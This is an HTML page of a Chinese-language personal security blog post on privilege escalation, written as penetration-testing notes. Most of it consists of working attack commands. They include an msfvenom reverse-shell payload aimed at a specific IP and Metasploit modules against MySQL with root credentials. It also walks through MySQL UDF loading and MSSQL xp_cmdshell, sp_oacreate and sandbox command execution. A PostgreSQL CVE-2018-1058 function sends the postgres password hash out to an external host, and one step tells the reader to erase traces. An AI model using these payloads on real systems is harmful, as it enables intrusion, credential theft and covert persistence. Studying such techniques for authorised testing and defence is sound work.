
<!DOCTYPE html>
<html lang="zh-Hans" class="loading">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>权限提升 - m4ao&#39;s blog</title>
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate" />
    <meta name="keywords" content="Fechin,"> 
    <meta name="description" content="权限提升后台权限：SQL注入,数据库备份泄露，默认或弱口令等获取帐号密码进入
网站权限：后台提升至网站权限，RCE或文件操作类、反序列化等漏洞直达Shell
数据库权限：SQL注入,数据库备份泄露，,"> 
    <meta name="author" content="John Doe"> 
    <link rel="alternative" href="atom.xml" title="m4ao&#39;s blog" type="application/atom+xml"> 
    <link rel="icon" href="/img/favicon.png"> 
    
    
    
    <meta name="twitter:card" content="summary"/>
    <meta name="twitter:title" content="权限提升 - m4ao&#39;s blog"/>
    <meta name="twitter:description" content="权限提升后台权限：SQL注入,数据库备份泄露，默认或弱口令等获取帐号密码进入
网站权限：后台提升至网站权限，RCE或文件操作类、反序列化等漏洞直达Shell
数据库权限：SQL注入,数据库备份泄露，,"/>
    
    
    
    
    <meta property="og:site_name" content="m4ao&#39;s blog"/>
    <meta property="og:type" content="object"/>
    <meta property="og:title" content="权限提升 - m4ao&#39;s blog"/>
    <meta property="og:description" content="权限提升后台权限：SQL注入,数据库备份泄露，默认或弱口令等获取帐号密码进入
网站权限：后台提升至网站权限，RCE或文件操作类、反序列化等漏洞直达Shell
数据库权限：SQL注入,数据库备份泄露，,"/>
    
<link rel="stylesheet" href="/css/diaspora.css">

    <script>window.searchDbPath = "/search.xml";</script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro&display=swap" rel="stylesheet">
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="loading">
    <span id="config-title" style="display:none">m4ao&#39;s blog</span>
    <div id="loader"></div>
    <div id="single">
    <div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
    <div title="播放/暂停" class="iconfont icon-play"></div>
    <h3 class="subtitle">权限提升</h3>
    <div class="social">
        <div>
            <div class="share">
                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
            </div>
            <div id="qr"></div>
        </div>
    </div>
    <div class="scrollbar"></div>
</div>

    <div class="section">
        <div class="article">
    <div class='main'>
        <h1 class="title">权限提升</h1>
        <div class="stuff">
            <span>九月 12, 2023</span>
            

        </div>
        <div class="content markdown">
            <h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>后台权限：SQL注入,数据库备份泄露，默认或弱口令等获取帐号密码进入</p>
<p>网站权限：后台提升至网站权限，RCE或文件操作类、反序列化等漏洞直达Shell</p>
<p>数据库权限：SQL注入,数据库备份泄露，默认或弱口令等进入或网站权限获取后转入</p>
<p>接口权限：SQL注入,数据库备份泄露，源码泄漏，配置不当等或网站权限获取后转入</p>
<p>系统权限：高危系统漏洞直达或网站权限提升转入、数据库权限提升转入，第三方转入等</p>
<p>域控权限：高危系统漏洞直达或内网横向渗透转入，域控其他服务安全转入等</p>
<p>3、以上常见权限获取后能操作的具体事情?</p>
<p>后台权限:</p>
<p>常规WEB界面文章分类等操作，后台功能可操作类</p>
<p>网站权限：</p>
<p>查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备。</p>
<p>数据库权限：</p>
<p>操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshell)进行的数据库配置文件读取获得。也可以作为提升系统权限手段。</p>
<p>接口权限：</p>
<p>后台或网站权限后的获取途径：后台（修改配置信息功能点），网站权限（查看的配置文件获取），具体可以操作的事情大家自己想想。</p>
<p>系统权限：如同在你自己操作自己的电脑一样</p>
<p>域控权限：如同在你自己操作自己的虚拟机一样</p>
<h3 id="windows-权限提升"><a href="#windows-权限提升" class="headerlink" title="windows 权限提升"></a>windows 权限提升</h3><h4 id="权限介绍"><a href="#权限介绍" class="headerlink" title="权限介绍"></a>权限介绍</h4><p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image.png" alt="image"></p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image2.png" alt="image2"></p>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>操作系统版本  漏洞补丁 位数 杀软防护 网络 当前权限 等信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ver </span><br><span class="line">systeminfo</span><br><span class="line">netstat -ano</span><br><span class="line">tasklist /svc</span><br></pre></td></tr></table></figure>

<h4 id="手工提权"><a href="#手工提权" class="headerlink" title="手工提权"></a>手工提权</h4><ul>
<li>WindowsVulnScan</li>
</ul>
<p>筛选exp</p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230804150106665.png" alt="image-20230804150106665"></p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230804150637150.png" alt="image-20230804150637150"></p>
<ul>
<li>wesng</li>
</ul>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230804151007406.png" alt="image-20230804151007406"></p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230804151549674.png" alt="image-20230804151549674"></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan">https://i.hacking8.com/tiquan</a></li>
</ul>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230804152338535.png" alt="image-20230804152338535"></p>
<p>exp 寻找</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/k8gege/Ladon</span><br><span class="line">https://github.com/Ascotbe/KernelHub</span><br><span class="line">https://github.com/nomi-sec/PoC-in-GitHub</span><br><span class="line">https://github.com/offensive-security/exploitdb</span><br><span class="line">http://cve.mitre.org/data/refs/refmap/source-MS.html</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="MSF半自动提权"><a href="#MSF半自动提权" class="headerlink" title="MSF半自动提权"></a>MSF半自动提权</h4><p>生成反弹木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=121.36.36.99 LPORT=5555 -f exe -o msf.exe</span><br></pre></td></tr></table></figure>

<p>配置监听会话</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230805154253878.png" alt="image-20230805154253878"></p>
<p>筛选EXP模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use post/windows/gather/enum_patches（半自动：根据漏洞编号找出系统中安装的补丁）</span><br><span class="line">use post/multi/recon/local_exploit_suggester（全自动：快速识别系统中可能被利用的漏洞)</span><br><span class="line">set showdescription true</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230805163215839.png" alt="image-20230805163215839"></p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230805164236488.png" alt="image-20230805164236488"></p>
<h4 id="CS自动提权"><a href="#CS自动提权" class="headerlink" title="CS自动提权"></a>CS自动提权</h4><p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230805173108781.png" alt="image-20230805173108781"></p>
<h3 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3><h4 id="提权条件"><a href="#提权条件" class="headerlink" title="提权条件"></a>提权条件</h4><p>-secure-file-priv 没有用户限制</p>
<p>1、数据库最高权限用户的密码</p>
<p>2、网站存在高权限SQL注入点</p>
<p>3、网站应用源码中的数据库配置文件</p>
<p>4、采用工具或脚本爆破（需解决外联问题）</p>
<h4 id="MYSQL-UDF-MOF-启动项反弹shell"><a href="#MYSQL-UDF-MOF-启动项反弹shell" class="headerlink" title="MYSQL-UDF&amp;MOF&amp;启动项反弹shell"></a>MYSQL-UDF&amp;MOF&amp;启动项反弹shell</h4><h5 id="一、UDF"><a href="#一、UDF" class="headerlink" title="一、UDF"></a>一、UDF</h5><p>一、什么是udf</p>
<p>udf 全称为：user defined function, 意为用户自定义函数；用户可以添加自定义的新函数到Mysql中，以达到功能的扩充，调用方式与一般系统自带的函数相同，例如 contact()，user()，version()等函数。</p>
<p>udf 文件一般为 dll, 由c、c++ 编写</p>
<p>二、udf 在渗透中的作用</p>
<p>在一般渗透过程中，拿下一台windows服务器的webshell时，由于webshell权限较低，有些操作无法进行，而此时本地恰好存在mysql数据库，那么udf可能就派上用场了；由于Windows安装mysql进程一般拥有管理员权限，这就意味着用户自定义的函数也拥有管理员权限，我们也就拥有了执行管理员命令的权限，这时候新建管理员用户操作也就轻而易举了，大多数人称为这一操作为udf提权，其实表达不够准确，应该称为通过mysql获得管理员权限。</p>
<p>三、利用条件</p>
<p>利用udf的条件其实还是苛刻的</p>
<p>mysql用户权限问题</p>
<p>获得一个数据库账号，拥有对Mysql 的 insert 和 delete 权限。以root为佳。</p>
<p>拥有将udf.dll 写入相应目录的权限。</p>
<p>四、数据库版本问题</p>
<p>udf利用的其中一步，是要将我们的xxx.dll 文件上传到mysql检索目录中，mysql各版本的检索目录有所不同:</p>
<table>
<thead>
<tr>
<th>版本</th>
<th>路径</th>
</tr>
</thead>
<tbody><tr>
<td>MySQL &lt; 5.0</td>
<td>导出路径随意；</td>
</tr>
<tr>
<td>5.0 &lt;&#x3D; MySQL&lt; 5.1</td>
<td>需要导出至目标服务器的系统目录（如：c:&#x2F;windows&#x2F;system32&#x2F;）</td>
</tr>
<tr>
<td>5.1 &lt; MySQL</td>
<td>必须导出到MySQL安装目录下的lib\plugin文件夹下</td>
</tr>
</tbody></table>
<p>一般Lib、Plugin 文件夹需要手工建立（可用户NTFS ADS流模式而创建文件夹）</p>
<p>二、本地利用过程</p>
<p>1、获取Mysql安装路径</p>
<p>select @basedir</p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/wps1.jpg" alt="wps1.jpg"> </p>
<p><strong>2、</strong><em><strong>*查看可操作路径*</strong></em></p>
<p>show global variables like %secure%</p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/wps2.jpg" alt="wps2.jpg"> </p>
<p>3、查看plugin 目录路径</p>
<p>select @@plugin_dir</p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/wps3.jpg" alt="wps3.jpg"> </p>
<p>4、将dll上传方式推荐集中</p>
<p>将dll 上传到安装路径的方式：</p>
<p>通过webshell 上传</p>
<p>以 hex 方式直接上传</p>
<p>5、sqlmap中现有的udf文件，分别为32位和64位，一定要选择对版本，获取sqlmap的udf方式</p>
<p>在 D:\新建文件夹\sqlmapproject-sqlmap-216565f\data\udf\mysql\windows\64</p>
<p> 但是 sqlmap中自带的shell以及一些二进制文件，为了防止误杀都经过异或编码，不能直接使用</p>
<p>可以利用sqlmap 自带的解码工具cloak.py, 在sqlmap\extra\cloak 中打开命令行，来对lib_mysqludf_sys.dll 进行解码在，然后在直接利用，输入下面的</p>
<p>cloak.py -d -i C:\sqlmap\data\udf\mysql\windows\64\lib_mysqludf_sys.dll</p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/wps4.jpg" alt="wps4.jpg"> </p>
<p>接着就会在\sqlmap\data\udf\mysql\windows\64目录下生成一个dll的文件lib_mysqludf_sys.dll，这个我们就可以直接拿来利用</p>
<p><em><strong>*攻击者可以利用lib_mysqludf_sys提供的函数执行系统命令*</strong></em></p>
<p>函数:</p>
<p>sys_eval ,执行任意命令，并将输出返回</p>
<p>sys_exec,执行任意命令，并将退出码返回</p>
<p>sys_get,获取一个环境变量</p>
<p>sys_set 创建或修改一个环境变量</p>
<p>以我 widows 系统为例，mysql版本为MySQL5.7.26</p>
<p>注意：攻击过程中，首先要将lib_mysqludf_sys (目标为Windows时，lib_mysqludf_sys.dll,linux时，lib_mysqludf_sys.so) 上传到数据库能访问的路径下。</p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/wps5.jpg" alt="wps5.jpg"> </p>
<p>直接将刚刚生成的64位windows的dll文件复制到D:\phpstudy8\Extensions\MySQL5.7.26\lib\plugin\中，然后再mysql中执行以下语句</p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/wps6.jpg" alt="wps6.jpg"> </p>
<p>然后就可以任意命令执行了 </p>
<p>三、实战情况之一，hex编&#x2F;解传入mysql系统提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">本地利用的情况，你得已经上传webshell的情况下才能成功，如果在sql实战中遇到可以使用outfile 等上传文件的情况下，如果利用来系统权限命令执行。下面我们先熟悉一下本地测试一下具体情况</span><br><span class="line"></span><br><span class="line">一、新建一个表，名为udftmp，用于存放本地传来的udf文件的内容。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">create table udftmp (c BLOB)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">二、在udftmp中写入udf文件内容</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">INSERT INTO udftmp values(unhex(&#x27;udf文件的16进制格式&#x27;))</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">三、将udf文件内容传入新建的udf文件中，路径根据自己的@@plugin_dir修改 //对于mysql小于5.1的，导出目录为C:\Windows\或C:\Windows\System32\</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">select c from udftmp into dumpfile &#x27;D:/phpstudy8/Extensions/MySQL5.7.26/lib/plugin/udf.dll&#x27;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">四、执行下面语句，就可以system权限下命令任意执行，这电脑就沦陷了，执行命令上面已经说过，就不复述了</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">create function sys_eval returns string soname &#x27;udf.dll&#x27;</span><br><span class="line"></span><br><span class="line">四、删除痕迹，做好事不留名</span><br><span class="line"></span><br><span class="line">DROP TABLE udftmp</span><br><span class="line"></span><br><span class="line">select &#x27;a部分十六进制&#x27; into dumpfile &#x27;/usr/lib/mariadb/plugin/a.txt&#x27;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">select load_file(&#x27;/usr/lib/mariadb/plugin/a.txt&#x27;)</span><br><span class="line"></span><br><span class="line">查看是否导入成功</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">select unhex(concat(load_file(&#x27;/usr/lib/mariadb/plugin/a.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/b.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/c.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/d.txt&#x27;))) into dumpfile &#x27;/usr/lib/mariadb/plugin/udf.so&#x27;</span><br><span class="line"></span><br><span class="line">生成 udf.so 文件</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MSF:（前提先开外链）</span><br><span class="line">use exploit/multi/mysql/mysql_udf_payload</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set password root</span><br><span class="line">set rhosts 47.102.195.100</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h5 id="二、MOF"><a href="#二、MOF" class="headerlink" title="二、MOF"></a>二、MOF</h5><p>MOF-Win2008后权限控制导致无效</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/xishaonian/p/6384535.html</span><br><span class="line">MSF：use exploit/windows/mysql/mysql_mof</span><br></pre></td></tr></table></figure>

<h5 id="三、启动项"><a href="#三、启动项" class="headerlink" title="三、启动项"></a>三、启动项</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MSF：（前提先开外链）</span><br><span class="line">use exploit/windows/mysql/mysql_start_up</span><br><span class="line">set rhosts 47.102.195.100</span><br><span class="line">set username root</span><br><span class="line">set password root</span><br><span class="line">run</span><br></pre></td></tr></table></figure>



<h4 id="MSQL-xp-cmdshell-sp-oacreate-沙盒"><a href="#MSQL-xp-cmdshell-sp-oacreate-沙盒" class="headerlink" title="MSQL-xp_cmdshell&amp;sp_oacreate&amp;沙盒"></a>MSQL-xp_cmdshell&amp;sp_oacreate&amp;沙盒</h4><h5 id="一、xp-cmdshell"><a href="#一、xp-cmdshell" class="headerlink" title="一、xp_cmdshell"></a>一、xp_cmdshell</h5><p>xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重修开启它。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">启用：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">关闭：</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">reconfigure;</span><br><span class="line">exec sp_configure &#x27;xp_cmdshell&#x27;, 0;</span><br><span class="line">reconfigure;</span><br><span class="line">执行：</span><br><span class="line">EXEC master.dbo.xp_cmdshell &#x27;命令&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230806034847674.png" alt="image-20230806034847674"></p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230806034933713.png" alt="image-20230806034933713"></p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230806035007312.png" alt="image-20230806035007312"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复</span><br><span class="line">exec master.sys.sp_addextendedproc &#x27;xp_cmdshell&#x27;, &#x27;C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll&#x27;</span><br></pre></td></tr></table></figure>

<h5 id="二、sp-oacreate"><a href="#二、sp-oacreate" class="headerlink" title="二、sp_oacreate"></a>二、sp_oacreate</h5><p>主要是用来调用OLE对象，利用OLE对象的run方法执行系统命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">启用：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;   </span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line">关闭：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;   </span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 0;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line">执行：</span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230806035536174.png" alt="image-20230806035536174"></p>
<h4 id="SQL-Server-沙盒提权"><a href="#SQL-Server-沙盒提权" class="headerlink" title="SQL Server 沙盒提权"></a>SQL Server 沙盒提权</h4><p>沙盒模式是数据库的一种安全功能。在沙盒模式下，只对控件和字段属性中的安全且不含恶意代码的表达式求值。如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的。利用前提需要sqlserver sysadmin账户服务器权限为system（sqlserver2019默认被降权为mssql），服务器拥有 jet.oledb.4.0 驱动。局限：（1）Microsoft.jet.oledb.4.0一般在32位操作系统上才可以 （2）Windows 2008以上 默认无 Access 数据库文件, 需要自己上传 sqlserver2015默认禁用Ad Hoc Distributed Queries，需要开启。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-- 开启Ad Hoc Distributed Queries</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;</span><br><span class="line">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1;reconfigure;</span><br><span class="line">-- 关闭Ad Hoc Distributed Queries</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;</span><br><span class="line">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,0;reconfigure;</span><br></pre></td></tr></table></figure>

<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- 关闭沙盒模式</span><br><span class="line">exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0;</span><br><span class="line">-- 恢复默认沙盒模式</span><br><span class="line">exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,2;</span><br></pre></td></tr></table></figure>

<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 执行系统命令</span><br><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:\windows\system32\ias\ias.mdb&#x27;,&#x27;select shell(&quot;cmd.exe /c whoami&quot;)&#x27;)</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230806041004968.png" alt="image-20230806041004968"></p>
<h4 id="PostgreSQL数据库权限提升"><a href="#PostgreSQL数据库权限提升" class="headerlink" title="PostgreSQL数据库权限提升"></a>PostgreSQL数据库权限提升</h4><p>PostgreSQL 是一款关系型数据库。其9.3到10版本中存在一个逻辑错误，导致超级用户在不知情的情况下触发普通用户创建的恶意代码，导致执行一些不可预期的操作。</p>
<p>端口：5432</p>
<h5 id="CVE-2018-1058-PostgreSQL-提权漏洞"><a href="#CVE-2018-1058-PostgreSQL-提权漏洞" class="headerlink" title="CVE-2018-1058(PostgreSQL 提权漏洞)"></a>CVE-2018-1058(PostgreSQL 提权漏洞)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">普通用户登录</span><br><span class="line">psql --host 127.0.0.1 --username postgres</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1、普通用户植入后门命令</span><br><span class="line">CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$</span><br><span class="line">    select dblink_connect((select &#x27;hostaddr=43.139.157.254 port=6666 user=postgres password=chybeta sslmode=disable dbname=&#x27;||(SELECT passwd FROM pg_shadow WHERE usename=&#x27;postgres&#x27;))); </span><br><span class="line">    SELECT pg_catalog.array_to_string($1,$2);</span><br><span class="line">$$ LANGUAGE SQL VOLATILE;</span><br><span class="line">2、管理员操作数据库触发</span><br><span class="line">docker-compose exec postgres pg_dump -U postgres -f evil.bak vulhub</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230807112724221.png" alt="image-20230807112724221"></p>
<h5 id="CVE-2019-9193-（高权限命令执行漏洞）"><a href="#CVE-2019-9193-（高权限命令执行漏洞）" class="headerlink" title="CVE-2019-9193 （高权限命令执行漏洞）"></a>CVE-2019-9193 （高权限命令执行漏洞）</h5><p>PostgreSQL 是一款关系型数据库。其9.3到11版本中存在一处“特性”，管理员或具有“COPY TO&#x2F;FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE IF EXISTS cmd_exec;</span><br><span class="line">CREATE TABLE cmd_exec(cmd_output text);</span><br><span class="line">COPY cmd_exec FROM PROGRAM &#x27;id&#x27;;</span><br><span class="line">SELECT * FROM cmd_exec;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230807123343473.png" alt="image-20230807123343473"></p>
<h3 id="WIN-本地用户提权"><a href="#WIN-本地用户提权" class="headerlink" title="WIN 本地用户提权"></a>WIN 本地用户提权</h3><h4 id="AT-SC-PS-命令"><a href="#AT-SC-PS-命令" class="headerlink" title="AT&amp;SC&amp;PS 命令"></a>AT&amp;SC&amp;PS 命令</h4><p><strong>一、at命令提权的原理</strong></p>
<p>at命令是一个计划命令，可以在规定时间完成一些操作，这个命令调用system权限。</p>
<p>适用版本：Win2000 &amp; Win2003 &amp; XP中还是存在的，在Win7以后被剔除.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at 21:00 /interactive cmd</span><br></pre></td></tr></table></figure>

